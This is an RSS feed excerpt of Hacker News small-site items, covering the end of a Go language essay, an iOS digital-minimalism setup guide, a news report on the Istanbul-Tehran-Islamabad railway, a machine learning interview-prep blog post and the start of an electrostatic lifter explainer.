<p>If you’re interested in getting started with Go, check out <a href="https://github.com/gopheracademy/gopher/blob/1cdbcd9fc3ba58efd628d4a6a552befc8e3912be/bot/bot.go#L516">the beginner’s
resources</a>
we point people to when they join the Gophers slack channel. See
<a href="https://golang.org/help/">https://golang.org/help/</a>.</p>

<h2 id="caveats">Caveats</h2>

<p>Of course, no programming tool is entirely free of problems. Given that this
article explains why Go is my favorite programming language, it focuses on the
positives. I will mention a few issues in passing, though:</p>

<ul>
<li>If you use Go packages which don’t offer a stable API, you might want to use a specific, known-working version. Your best bet is the <a href="https://github.com/golang/dep">dep</a> tool, which is not part of the language at the time of writing.</li>
<li>Idiomatic Go code does not necessarily translate to the highest performance machine code, and the runtime comes at a (small) cost. In the rare cases where I found performance lacking, I successfully resorted to <a href="https://golang.org/cmd/cgo/">cgo</a> or assembler. If your domain is hard-realtime applications or otherwise extremely performance-critical code, your mileage may vary, though.</li>
<li>I wrote that the Go standard library is the best I have ever seen, but that doesn’t mean it doesn’t have any problems. One example is <a href="https://golang.org/issues/20744">complicated handling of comments</a> when modifying Go code programmatically via one of the standard library’s oldest packages, <code>go/ast</code>.</li>
</ul>

</div></div>]]>
            </description>
            <link>https://michael.stapelberg.ch/posts/2017-08-19-golang_favorite/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25723749</guid>
            <pubDate>Mon, 11 Jan 2021 02:49:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[iOS Setup Guide for Digital Minimalists – MJUK]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25723702">thread link</a>) | @voisin
<br/>
January 10, 2021 | https://www.mattjennings.uk/ios-setup-guide-for-digital-minimalists/ | <a href="https://web.archive.org/web/*/https://www.mattjennings.uk/ios-setup-guide-for-digital-minimalists/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><img width="696" height="392" src="https://www.mattjennings.uk/wp-content/uploads/2021/01/iPhone-Settings-App-696x392.jpg" srcset="https://www.mattjennings.uk/wp-content/uploads/2021/01/iPhone-Settings-App-696x392.jpg 696w, https://www.mattjennings.uk/wp-content/uploads/2021/01/iPhone-Settings-App-300x169.jpg 300w, https://www.mattjennings.uk/wp-content/uploads/2021/01/iPhone-Settings-App-1024x577.jpg 1024w, https://www.mattjennings.uk/wp-content/uploads/2021/01/iPhone-Settings-App-768x432.jpg 768w, https://www.mattjennings.uk/wp-content/uploads/2021/01/iPhone-Settings-App-1536x865.jpg 1536w, https://www.mattjennings.uk/wp-content/uploads/2021/01/iPhone-Settings-App-1068x601.jpg 1068w, https://www.mattjennings.uk/wp-content/uploads/2021/01/iPhone-Settings-App-746x420.jpg 746w, https://www.mattjennings.uk/wp-content/uploads/2021/01/iPhone-Settings-App-610x343.jpg 610w, https://www.mattjennings.uk/wp-content/uploads/2021/01/iPhone-Settings-App.jpg 1918w" sizes="(max-width: 696px) 100vw, 696px" alt="iPhone Settings App" title="iPhone Settings App" data-srcset="https://www.mattjennings.uk/wp-content/uploads/2021/01/iPhone-Settings-App-696x392.jpg 696w, https://www.mattjennings.uk/wp-content/uploads/2021/01/iPhone-Settings-App-300x169.jpg 300w, https://www.mattjennings.uk/wp-content/uploads/2021/01/iPhone-Settings-App-1024x577.jpg 1024w, https://www.mattjennings.uk/wp-content/uploads/2021/01/iPhone-Settings-App-768x432.jpg 768w, https://www.mattjennings.uk/wp-content/uploads/2021/01/iPhone-Settings-App-1536x865.jpg 1536w, https://www.mattjennings.uk/wp-content/uploads/2021/01/iPhone-Settings-App-1068x601.jpg 1068w, https://www.mattjennings.uk/wp-content/uploads/2021/01/iPhone-Settings-App-746x420.jpg 746w, https://www.mattjennings.uk/wp-content/uploads/2021/01/iPhone-Settings-App-610x343.jpg 610w, https://www.mattjennings.uk/wp-content/uploads/2021/01/iPhone-Settings-App.jpg 1918w" data-src="https://www.mattjennings.uk/wp-content/uploads/2021/01/iPhone-Settings-App-696x392.jpg" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><h2>Introduction</h2><p>This post follows on from my last titled ‘My MacOS Setup Guide for Digital Minimalists’. I found writing my last post highly beneficial in gaining clarity around my own Mac use, so thought it would be beneficial to do the same exercise across iOS.</p><p>As the smart phone has become a constant companion for most of us, it is even more crucial to effectively manage its use. A smart phone is an amazing tool and can make life easier and more productive, but if its use is eight hours a day scrolling subreddits and social accounts, that is not a good thing.&nbsp;</p><p>We’ve all been there, we’ve all spent too much time mindlessly scrolling content and websites knowing it does’t make use feel good, yet we still do it. We do it because it’s the path of least resistance to feeling like we are being ‘busy’. In actual fact, the activity just drains energy and more likely creates a chronic anxiety from putting off that thing that we should be doing. Once again, not a good thing.</p><p>Every-time we consume content, our lives and time are literally feeding the attention economy. We are trading our lives and lining the pockets of the rich, without even being aware of it. Unlike a job, we get nothing for our time traded.</p><p>Smart phones are useful, but we need to be the ones dictating its use, not the other why round.</p><p>Like my previous post for MacOS, this post will explain my current iOS setup from a perspective of digital minimalism that works for me but might be different for you.</p><p>If you find this useful, be kind and give it a like or share.</p><h2>Part One: Lock Screen</h2><div><a href="https://www.mattjennings.uk/wp-content/uploads/2021/01/File_000-1.png"><div><figure><img data-src="https://www.mattjennings.uk/wp-content/uploads/2021/01/File_000-1.png" alt="Minimalist iOS Lock Screen" width="231" height="500" data-srcset="https://www.mattjennings.uk/wp-content/uploads/2021/01/File_000-1.png 462w, https://www.mattjennings.uk/wp-content/uploads/2021/01/File_000-1-139x300.png 139w, https://www.mattjennings.uk/wp-content/uploads/2021/01/File_000-1-194x420.png 194w" sizes="(max-width: 231px) 100vw, 231px" src="https://www.mattjennings.uk/wp-content/uploads/2021/01/File_000-1.png" srcset="https://www.mattjennings.uk/wp-content/uploads/2021/01/File_000-1.png 462w, https://www.mattjennings.uk/wp-content/uploads/2021/01/File_000-1-139x300.png 139w, https://www.mattjennings.uk/wp-content/uploads/2021/01/File_000-1-194x420.png 194w"></figure></div></a></div><p>The lock screen is like the gateway drug to smartphone addiction. Unassuming on the surface, but can very easily lead to the substance abuse that is, content (over)consumption. From the lock screen, each hit comes in the form of Notifications, every ping releasing that dopamine we all can’t see to get enough of.</p><p>In and of itself the lock screen can’t be a distraction, but Notifications must be addressed in order to regain control of our digital lives. As you’ll see from the image above, my background image is one of the stock images provided by Apple. No time spent.</p><h2>Part Two: Home Screen</h2><div><a href="https://www.mattjennings.uk/wp-content/uploads/2021/01/iOS-Home-Screen.png"><div><figure><img width="231" height="500" data-src="https://www.mattjennings.uk/wp-content/uploads/2021/01/iOS-Home-Screen.png" alt="Minimalist iOS Home Screen" data-srcset="https://www.mattjennings.uk/wp-content/uploads/2021/01/iOS-Home-Screen.png 231w, https://www.mattjennings.uk/wp-content/uploads/2021/01/iOS-Home-Screen-139x300.png 139w, https://www.mattjennings.uk/wp-content/uploads/2021/01/iOS-Home-Screen-194x420.png 194w" sizes="(max-width: 231px) 100vw, 231px" src="https://www.mattjennings.uk/wp-content/uploads/2021/01/iOS-Home-Screen.png" srcset="https://www.mattjennings.uk/wp-content/uploads/2021/01/iOS-Home-Screen.png 231w, https://www.mattjennings.uk/wp-content/uploads/2021/01/iOS-Home-Screen-139x300.png 139w, https://www.mattjennings.uk/wp-content/uploads/2021/01/iOS-Home-Screen-194x420.png 194w"></figure></div></a></div><p>My home screen contains one app. The Drafts app. This is the only app I need to see and the only app I may need to access quickly from the home screen.</p><p>As the majority of any significant work is done on my Mac, outside of communication, I mainly use my iPhone for capturing tasks, ideas and thoughts that I can process at a later date, and the Drafts app is perfect for that. If I find myself needing to work on my phone, it just proves I haven’t planned my day properly and didn’t get done the things I should have in the time I allocated.</p><p>I find the issue with Home Screen setups that most have at the moment, is that they are in their very design made for distraction. It’s almost impossible to be intentional if as soon as you unlock your device, you have 100 notifications and various widgets vying for your attention. Next thing we realise 15 minutes have passed checking emails, the latest photo memories, social media and we’ve forgotten the reason why we even unlocked the phone in the first place.</p><p>Drafts allow me to capture ideas in the quickest way possible for later processing. When I do this, I can forget about the thing that I was thinking about, and carry on with my day.</p><h2>Part Three: App Library</h2><div><a href="https://www.mattjennings.uk/wp-content/uploads/2021/01/App-Library.png"><div><figure><img width="231" height="500" data-src="https://www.mattjennings.uk/wp-content/uploads/2021/01/App-Library.png" alt="iOS 14 App Library" data-srcset="https://www.mattjennings.uk/wp-content/uploads/2021/01/App-Library.png 231w, https://www.mattjennings.uk/wp-content/uploads/2021/01/App-Library-139x300.png 139w, https://www.mattjennings.uk/wp-content/uploads/2021/01/App-Library-194x420.png 194w" sizes="(max-width: 231px) 100vw, 231px" src="https://www.mattjennings.uk/wp-content/uploads/2021/01/App-Library.png" srcset="https://www.mattjennings.uk/wp-content/uploads/2021/01/App-Library.png 231w, https://www.mattjennings.uk/wp-content/uploads/2021/01/App-Library-139x300.png 139w, https://www.mattjennings.uk/wp-content/uploads/2021/01/App-Library-194x420.png 194w"></figure></div></a></div><p>In the latest version of iOS, all apps are conveniently located a quick swipe to the left from the home screen, this means you no longer need pages and pages of apps taking up your home screen, not that we should have pages and pages of apps in the first place.</p><p>I will now explain every app I currently have on my device and its relevant use, excluding the default iOS apps that can’t be removed.</p><h3>Social Apps</h3><ul><li>WhatsApp</li><li>Facebook Messenger</li></ul><p>Not counting the two stock social apps included in iOS being phone and messages, I have two apps used for social purposes. The first one being WhatsApp to keep in touch with people overseas, the second being Facebook messenger. I would be inclined to delete Facebook, but if I were to, I would physically need to go on Facebook to check messages from those I still do communicate on this platform with, which I’d rather not do. So I settle for having the Facebook messenger app.</p><h3>Productivity &amp; Finance Apps</h3><ul><li>1Password</li><li>Drafts</li><li>Fantastical</li><li>Gmail</li><li>HSBC</li><li>Notion</li><li>Slack</li></ul><p>My Productivity &amp; Finance Apps consist of seven applications. I use 1Password to store all of my passwords so is useful when accessing passwords and other important information when out and about. I have Drafts to store any thoughts I have throughout the day for later processing as mentioned earlier. I use Fantastical on my phone to check my schedule and be notified of upcoming activities.</p><p>I know I probably shouldn’t but I have Gmail on my phone, I don’t get that many emails and have unsubscribed from all junk, so anything that does come through is usually important. The notifications and the app actually prevent from checking email multiple times a day. I might tweak my workflow to remove this app at some point.</p><p>HSBC is a UK banking app, I would delete it and only access on web but I need this for authentication purposes. Quite annoying. Even though I am not in the UK, I still have the Monzo app on my phone. It is a great service and would be useful for when I find myself back there. NAB is my bank of choice in AUS and have it on my phone as it enables Smart Receipts through a service called SLYP.</p><p>Notion is the only workspace tool I use, everything from task management, reminders, projects, professional development and notes can all be accessed from my Notion system, and is useful to have access to throughout the day for task management.</p><p>I use Slack for work communication, useful for when I’m out and about but still need to be on call. I keep in touch with a couple of people in the UAE and because WhatsApp calling is banned there, I communicate using Zoom.</p><h3>Utilities</h3><p>I only have two non stock apps in the utilities section of my App Library. I have Google Authenticator in order to manage two factor authentication on various websites I use. I don’t have a browser on my phone, if there’s anything I need to check or look up throughout the day I simply make a note of it in Drafts and come back to it later.</p><h3>Health &amp; Fitness</h3><ul><li>Wim Hof Method</li><li>GoWOD</li></ul><p>There are two apps I use as part of my morning routine in the Health &amp; Fitness section of the App Library and highly recommend.</p><p>The first is the Wim Hof Method app. I have been practicing Wim Hof Method for the last couple of years and I find the Wim Hof Method app a great supporting app. Using the bubble breathing timer in the app makes practicing the breathing exercises and tracking data much easier, and I enjoy the challenges that come up from time to time.</p><p>The second app I use is GoWOD. This is a mobility app that creates a personalised daily mobility routine based on your current deficiencies. After lifting weights for years, I have only just started prioritising mobility and wish I had done sooner.</p><h3>Entertainment</h3><ul><li>Spotify</li></ul><p>I only have one app for entertainment purposes and that is the Spotify app. It serves as my music player and podcast player; all the entertainment I need on a phone. Once I am in a more permanent location, I will be looking to replace Spotify with analogue records and their digital equivalent.</p><h3>Travel</h3><ul><li>Google Maps</li></ul><p>I only have one app for travel purposes and that is Google Maps. For privacy purposes, I should probably be using a different app, but haven’t considered any other suitable alternatives yet.</p><h2>Notifications</h2><p>Turning off most notifications can be one of the simplest things to do in terms of regaining control of your digital habits, and for that reason I have most Notifications turned off. I have had all notifications turned off in the past, but found it actually promotes worse habits having to physically keep checking apps when someone is trying to get in touch with you. The 9 notifications I have turned on are as follows:</p><ul><li>Facetime</li><li>Fantastical</li><li>Gmail</li><li>Messages</li><li>Messenger</li><li>Phone</li><li>Slack</li><li>Whatsapp</li><li>Zoom</li></ul><p>You’ll notice that most of these app notifications are for communication and scheduling apps only.</p><h2>Conclusion</h2><p>When looking to create a more minimal iPhone experience and its resulting more intentional use, there’re habits that need to change too. It’s all well and good removing all social apps from your phone, but if the strong desire is still there to check these types of services, you will find a way to do it. Hopefully, by taking some of the ideas I have presented in this post, it might assist in helping some of you get there.</p><p>Find this post useful? Give it a like or share. Anything you think I could do better? Leave me a comment below.</p></div></div>]]>
            </description>
            <link>https://www.mattjennings.uk/ios-setup-guide-for-digital-minimalists/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25723702</guid>
            <pubDate>Mon, 11 Jan 2021 02:43:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[China's new Silk Road outlook includes Pakistan-Iran-Turkey railways networks]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25723492">thread link</a>) | @mardiyah
<br/>
January 10, 2021 | https://en.irna.ir/news/84171573/China-s-new-Silk-Road-outlook-includes-Pakistan-Iran-Turkey-railways | <a href="https://web.archive.org/web/*/https://en.irna.ir/news/84171573/China-s-new-Silk-Road-outlook-includes-Pakistan-Iran-Turkey-railways">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p itemprop="description">Tehran, Jan 4, IRNA â€“ Efforts aimed at the revival of the container-carrying Economic Cooperation Organization (ECO) train, which began during the recent decades by Iran, Pakistan and Turkey show the general outlook of Chinaâ€™s new Silk Road strategic ring-way.
            </p><div>
            <div itemprop="articleBody"><p>The 10th meeting of high ranking Islamabad-Tehran-Istanbul Railway Project workgroup, better known as the ECO Train was recently convened aimed at the urgent revival of this major regional economic plan.</p> 
<p>The spokesman of the Pakistan Foreign Ministry expressed certainty during his last week's press conference that the ECO Train project will be put to use during the new Christian year.</p> 
<p>Nikkei Asia economic news agency, too, wrote in a report that Iran, Turkey and Pakistan will put to use a railway that will link Istanbul, Tehran and Islamabad (ITI) in the year 2021. It is expected that the revival of the ITI ECO Train will through a rail-link join China's Belt and Road Initiative (BRI), sometimes referred to as the New Silk Road, and is one of the most ambitious infrastructure projects ever conceived.</p> 
<p>The roots of this macro-scale project can be traced to ECOâ€™s 2009 container carrying train. The Economic Cooperation Organization or ECO is an Asian political and economic intergovernmental organization that was founded in 1985 in Tehran by the leaders of Iran, Pakistan, and Turkey. It provides a platform to discuss ways to improve development and promote trade and investment opportunities.</p> 
<p>Yet, the container carrying service launched by ECO merely proceeded up to the launching stage and was never fully used. Even the three countries will for opening the passenger trains along with cargo trains service among them has yet never been implemented yet.</p> 
<p>The 6,540km railwayâ€™s length is more than one-sixth of the earth belt. It includes 1,950 kilometers in Turkey, 26,600 kilometers in Iran, and another 1,900 kilometers in Pakistan. Traveling from Islamabad to Istanbul by the ECO Train takes 10 days and is a lot faster than the 21-day sea voyage between Turkey and Pakistan.</p> 
<p>A Pakistani state official who spoke to Nikkei Asia on condition of anonymity said that the ITI ECO Train will link through Pakistanâ€™s ML-1 railroad to Chinaâ€™s Uyghur-Xinjiang region, which is the major China-Pakistan economic zone and within Chinaâ€™s BRI mega-project. The completion of the project is scheduled for the year 2026.</p> 
<p>Economic observers believe the ITO ECO Train is the western side continuation of Chinaâ€™s BRI project. Lukasz Przybyszewski, a West Asia analyst in Asia Research Center of Warsaw War Studies Academy believes China considers the Iranian railways in particular, and the ECO railways in general as a major part of its BRI mega-project. During the war and crisis times, the land commercial routes are very precious and useful substitutes for the sea and airways.</p> 
<p>He added that China considers those three countries (Iran, Pakistan and Turkey) as active partners in its BRI project that need further investments with very precise planning in this project.</p> 
<p>The ITI will be the first regular China-Turkey rail service.</p> 
<p>Yet, there is also an indirect possibility. On Dec 19, 2020 a train traveled through Turkey, Azerbaijan Republic, and the Caspian Sea to Chinaâ€™s Xian city, in that countryâ€™s Shaanxi province, on the northeast side of Xinjiang province, which is at the farthest eastern end of the Silk Road, which once connected Ancient China to the Mediterranean region.</p> 
<p>This path, known as the East-West Trans-Caspian Corridor, travels through the Baku-Tbilisi-Kars railways and the economic analyst believe China can develop its BRI project through both paths.</p> 
<p>James M. Dorsey, a senior fellow at the S. Rajaratnam School of International Studies at Singapore's Nanyang Technological University says that Beijingâ€™s decisions on privileges and superiority of the ITI path towards Xian will eventually reflect Chinaâ€™s geopolitical economic ambitions.</p> 
<p>Dorsey said that in Beijingâ€™s stands and approach, Turkey is a significant economic market and in the long-run having numerous railways connecting China and Turkey will be very ideal for Beijing.</p> 
<p>1424</p> 
<p>Follow us on Twitter <a href="http://twitter.com/irnaengish">@irnaenglish</a></p> 
 

            </div>
            
        </div></div>]]>
            </description>
            <link>https://en.irna.ir/news/84171573/China-s-new-Silk-Road-outlook-includes-Pakistan-Iran-Turkey-railways</link>
            <guid isPermaLink="false">hacker-news-small-sites-25723492</guid>
            <pubDate>Mon, 11 Jan 2021 02:18:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Types of Machine Learning Interview Questions]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25723491">thread link</a>) | @data4lyfe
<br/>
January 10, 2021 | https://www.interviewquery.com/blog-machine-learning-interview-questions/ | <a href="https://web.archive.org/web/*/https://www.interviewquery.com/blog-machine-learning-interview-questions/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
                <div>
                    <p>Table of Contents</p><!--kg-card-begin: html--><!--kg-card-end: html--><h2 id="introduction">Introduction</h2><p>Machine learning and modeling interview questions cover some of the most basic fundamentals in data science. Given that it’s a rapidly evolving field, machine learning is almost always in need of updates. Therefore, as a data scientist, it’s important to keep up with the latest trends and technologies that are constantly being released.</p><p>Modeling interview questions and the machine learning interview are many times <strong>an</strong> <strong>abstraction for testing a candidate’s experience in the field</strong>, as well as determining to what degree a data scientist or machine learning engineer can critically <strong>apply theory towards a business goal</strong>.</p><p>As we go through each framework, interview question, and machine learning concept, it’s worth remembering that machine learning and modeling interview questions are ultimately indicative of two things:</p><ul><li>A candidate’s past experience working with machine learning.</li><li>The capacity to memorize concepts and apply them towards solutions the interviewer is looking for.</li></ul><h2 id="how-much-machine-learning-do-i-need-to-know">How much machine learning do I need to know?<br></h2><p>This is the most repetitive question that I have gotten ever since starting <a href="https://www.interviewquery.com/">Interview Query</a>. Why do you think that is? Because there is an infinite amount of knowledge you can consume in machine learning. </p><p><strong>Literally infinite.</strong> The very definition of machine learning and AI conceptualizes this fact.</p><p>Machine learning is a technology that is breaking ground every day. Technically, it should be improving faster and faster, given that machine learning and artificial intelligence is essentially supposed to be learning itself.</p><p>However, machine learning tested in an interview is completely different from how it is generally framed in real practice. It is also different depending on the type of role that you’re interviewing for. </p><p>A data scientist is not expected to know the same level of knowledge necessary for machine learning compared to a machine learning engineer or research scientist. This varying expectation, however, can be confounded by what the employer thinks a data scientist does versus a machine learning engineer, such as a case where the role is titled data scientist, but the position is instead designed for building machine learning infrastructure the whole time.</p><p>Let’s look at how much each role and position needs to know about machine learning interview questions.</p><h3 id="data-scientist">Data Scientist </h3><p>The data scientist role is primarily responsible for solving business problems using data to pull, munge, and generate insights from data. Data scientists will explore all aspects of the business and work cross-functionally with different teams to do everything from developing dashboards for reporting and exploring analytics for insights, to building models.</p><p>The last part of building models is tricky in determining how much machine learning a data scientist should know. Many data science roles that are focused on analytics don’t require any machine learning at all, while some roles are essentially machine learning engineers with a data scientist title. Generally, the main way to understand the difference is to ask everyone at the company about the day-to-day responsibilities of the role that you’re interviewing for.</p><p>For example, if we look at the Facebook Data Scientist role, we won't see much machine learning tested in their interview. </p><figure><img src="https://blog.interviewquery.com/content/images/2020/12/image-13.png" alt="" srcset="https://blog.interviewquery.com/content/images/size/w600/2020/12/image-13.png 600w, https://blog.interviewquery.com/content/images/size/w1000/2020/12/image-13.png 1000w, https://blog.interviewquery.com/content/images/2020/12/image-13.png 1150w" sizes="(min-width: 720px) 720px"><figcaption>Image from <a href="https://www.interviewquery.com/interview-experiences/facebook/data-scientist">Interview Query</a></figcaption></figure><p>But if we compare it with the data science role for C3.ai and we see a huge emphasis on machine learning. </p><figure><img src="https://blog.interviewquery.com/content/images/2020/12/image-14.png" alt="" srcset="https://blog.interviewquery.com/content/images/size/w600/2020/12/image-14.png 600w, https://blog.interviewquery.com/content/images/size/w1000/2020/12/image-14.png 1000w, https://blog.interviewquery.com/content/images/2020/12/image-14.png 1180w" sizes="(min-width: 720px) 720px"><figcaption><a href="https://www.interviewquery.com/interview-experiences/c3.ai/data-scientist">C3.AI Data Science Role from Interview Query</a></figcaption></figure><h3 id="machine-learning-engineers-and-data-engineers">Machine Learning Engineers and Data Engineers</h3><p>Engineers build models and deploy them, develop infrastructure to scale, and work with data scientists to understand the best-use cases. They leverage data tools, programming frameworks, and data pipelines to ensure that models scale appropriately for any technical specifications.</p><p>Machine learning engineers should also have a strong knowledge of machine learning and theory, given their responsibility for building tooling and automation over the model creation, training, and evaluation life cycle.</p><p>Regular software engineers aren't expected to know too much about machine learning. But data engineers will likely need to know how to scale up data infrastructure alongside the machine learning engineers so that the models can retrieve and output the correct data points. </p><h3 id="research-scientists-and-ai-researchers">Research Scientists and AI Researchers</h3><p>Research scientists are typically roles meant for teams to break new ground with machine learning in the research domain. The level of machine learning and statistics knowledge needed is usually very high.</p><p>Given these three roles, the best way to estimate how much machine learning knowledge is needed for the interview would be to first understand how embedded in machine learning your job will be. This is done with individual research on the company, position, team, and background information of your interview panel.<br></p><h2 id="machine-learning-interview-questions-and-concepts">Machine Learning Interview Questions and Concepts</h2><figure><img src="https://blog.interviewquery.com/content/images/2021/01/image-15.png" alt="" srcset="https://blog.interviewquery.com/content/images/size/w600/2021/01/image-15.png 600w, https://blog.interviewquery.com/content/images/size/w1000/2021/01/image-15.png 1000w, https://blog.interviewquery.com/content/images/2021/01/image-15.png 1500w" sizes="(min-width: 720px) 720px"></figure><p>Machine learning interview questions follow a couple of patterns. While they can seem abstract and overwhelming, we can break them down into six types of situational problems and case studies.</p><h3 id="modeling-and-machine-learning-case-study-interview">Modeling and Machine Learning Case Study Interview</h3><p>The modeling case study requires a candidate to evaluate and explain a particular part of the model building process. A common case study problem would be for a candidate to explain how they would build a model for a product that exists at the company.</p><p><strong>Example Question: </strong><em>Describe how you would build a model to predict Uber ETAs after a rider requests a ride.</em></p><p>Many times, this can be scoped down into a specific portion of the model building process. For instance, taking the example above, we could instead reword the problem to:</p><ul><li><em>How would you evaluate the predictions of an Uber ETA model?</em></li><li><em>What features would you use to predict the Uber ETA for ride requests?</em></li></ul><p>The main point of these case questions is to determine your knowledge of the full modeling lifecycle and how you would apply it to a business scenario.</p><p>We want to approach the case study with an understanding of what the machine learning &amp; modeling lifecycle should look like from beginning to end, as well as creating a structured format to make sure we’re delivering a solution that explains our thought process thoroughly.</p><p>For the machine learning lifecycle, we have around six different steps that we should touch on from beginning to end:</p><ul><li>Data Exploration &amp; Pre-Processing</li><li>Feature Selection &amp; Engineering</li><li>Model Selection</li><li>Cross Validation</li><li>Evaluation Metrics</li><li>Testing and Roll Out</li></ul><p>Try a machine learning case question on Interview Query<strong>:</strong> <a href="https://www.interviewquery.com/questions/bank-fraud-model"><strong>Bank Fraud Model</strong></a></p><blockquote><em>Let's say that you work at a bank that wants to build a model to detect fraud on the platform.</em></blockquote><blockquote><em>The bank wants to implement a text messaging service in addition that will text customers when the model detects a fraudulent transaction in order for the customer to approve or deny the transaction with a text response.</em></blockquote><blockquote><em>How would we build this model?</em></blockquote><figure><a href="https://www.interviewquery.com/questions/bank-fraud-model"><div><p>Bank Fraud Model — Interview Query machine learning problem</p><p>Let&amp;#39;s say that you work at a bank that wants to build a model to detect fraud on the platform.The bank wants to implement a text messaging service in addition that will text customers</p><p><img src="https://www.interviewquery.com/img/iq-logo.png"></p></div></a></figure><p><em>Read more about how to frame a <a href="https://www.interviewquery.com/courses/data-science-course">machine learning case study in our interview course</a>. </em></p><p>Check out a mock machine learning case study interview asked by Uber.</p><!--kg-card-begin: html--><iframe width="560" height="315" src="https://www.youtube.com/embed/ierVctGQ3EQ?start=200" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
<!--kg-card-end: html--><h3 id="recommendation-and-search-engines-interview-questions">Recommendation and Search Engines Interview Questions</h3><p>Recommendation and search engines are questions that are technically case study questions but are asked so frequently that it’s important to conceptualize them into their own category.</p><p><strong>Example Questions</strong></p><ul><li>How would you build a recommendation engine to recommend news to users on Google?</li><li>How would you evaluate a new search engine that your co-worker built?</li></ul><p>Most strategies for tackling recommendation and search engines are to:</p><ol><li>Understand how they are built and what underlying machine learning algorithms they use.</li><li>Learn how to effectively deploy the recommendation and search algorithm.</li><li>Communicate how to measure their performance and improve their training abilities. </li></ol><p>Try out solving a recommendation feed interview question asked by LinkedIn: <a href="https://www.interviewquery.com/questions/job-recommendation"><strong>Job Recommendations</strong></a></p><blockquote>Let's say that you're working on a job recommendation engine. You have access to all user Linkedin profiles, a list of jobs each user applied to, and answers to questions that the user filled in about their job search.</blockquote><blockquote>Using this information, how would you build a job recommendation feed?</blockquote><figure><a href="https://www.interviewquery.com/questions/job-recommendation"><div><p>Job Recommendation — Interview Query machine learning problem</p><p>Let&amp;#39;s say that you&amp;#39;re working on a job recommendation engine. You have access to all user Linkedin profiles, a list of jobs each user applied to, and answers to questions that</p><p><img src="https://www.interviewquery.com/img/iq-logo.png"></p></div></a></figure><h3 id="machine-learning-algorithms-interview-questions">Machine Learning Algorithms Interview Questions</h3><p>These types of questions exist to get an in-depth understanding of your <strong>conceptual knowledge of machine learning</strong>. Companies ask these questions mostly to machine learning and deep learning specialists that would be focusing on the specific building and training of a machine learning model.</p><p>These types of questions would be something akin to “How does random forest generate trees?” or “What’s the difference between SVM and Gradient Boosting Trees?”.</p><p>For example, a common question asked within the machine learning algorithms interview questions is on the<strong> </strong>bias/variance tradeoff.</p><p><strong>What is bias in a model? </strong>Bias is the amount our predictions are systematically off from the target. Bias is the measure of how “inflexible” the model is. <br><strong>What is variance in a model? </strong>Variance is the measure of how much the prediction would vary if the model was trained on a different dataset, drawn from the same population. Can be also thought of as the “flexibility” of the model. </p><p><strong>Generally, what happens to bias &amp; variance as we increase the complexity of the model? </strong>Bias decreases and variance increases</p><p>Try out solving a machine learning algorithms interview question asked by Airbnb: <strong><a href="https://www.interviewquery.com/questions/booking-regression">Booking Regression</a></strong></p><figure><a href="https://www.interviewquery.com/questions/booking-regression"><div><p>Booking Regression — Interview Query machine learning problem</p><p>Let&amp;#39;s say we …</p></div></a></figure></div></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.interviewquery.com/blog-machine-learning-interview-questions/">https://www.interviewquery.com/blog-machine-learning-interview-questions/</a></em></p>]]>
            </description>
            <link>https://www.interviewquery.com/blog-machine-learning-interview-questions/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25723491</guid>
            <pubDate>Mon, 11 Jan 2021 02:18:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[High Voltage “Lifter”]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25723430">thread link</a>) | @mindcrime
<br/>
January 10, 2021 | https://electricmuseum.com/312/ | <a href="https://web.archive.org/web/*/https://electricmuseum.com/312/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="wrap">

			
			
<!-- #site-header -->


			
			<main id="main" role="main">

				

<!-- .page-header -->


	
	<div id="content-wrap">

		
		<div id="primary">

			
			<div id="content">

				
				
<article id="post-312">

	

<div itemprop="text">
	<div>



<p><span>Electrostatic lifters are fascinating devices that have become popular construction projects for experimenters all over the world.&nbsp;&nbsp; NASA’s recent patent on a type of lifter design has&nbsp; spurred further&nbsp; interest in these devices.</span></p>
<p><img loading="lazy" title="lifter_2" src="https://electricmuseum.com/wp-content/uploads/lifter_2.jpg" alt="lifter_2" width="371" height="268"></p>
<h3><span>What is a lifter?</span></h3>

<p><span> The basic device merely consists of a lightweight (typically balsa wood) frame, to which is attached a wire and a sort of aluminum foil skirt. The photos on this page&nbsp; illustrate this. The wire is charged to approximately 30,000 volts by means of a power supply and very thin wire attached to the corona wire. The aluminum foil skirt is coneccted to ground by a thin wire as well. When the device is powered it developes downward thrust and levitates.</span></p>
<figure><img loading="lazy" title="lifter_1" src="https://electricmuseum.com/wp-content/uploads/lifter_1.jpg" alt="lifter_1" width="540" height="306"><figcaption>Lifter being powered by a 50kV DC supply operated at approximately 25kV. Not visible is the thin positively charged “corona wire” which is strung above, and parallel to, the flat negatively charged aluminum “skirt”.</figcaption></figure>
<h3><span>How does it work?</span></h3>
<p><span>T</span><span>he device levitates by creating an electrostatic “wind”. This is caused as the thin positively charged corona wire ionizes the air surrounding it which is then repelled from the corona wire and pulled towards the negtively charged “skirt”. The force of this ion wind combined with the impact of the moving ions on the surrounding air creates an upward thrust. This is essentially how some of the “ionic breeze” air purifiers work that you may have seen in catalogs.</span></p>
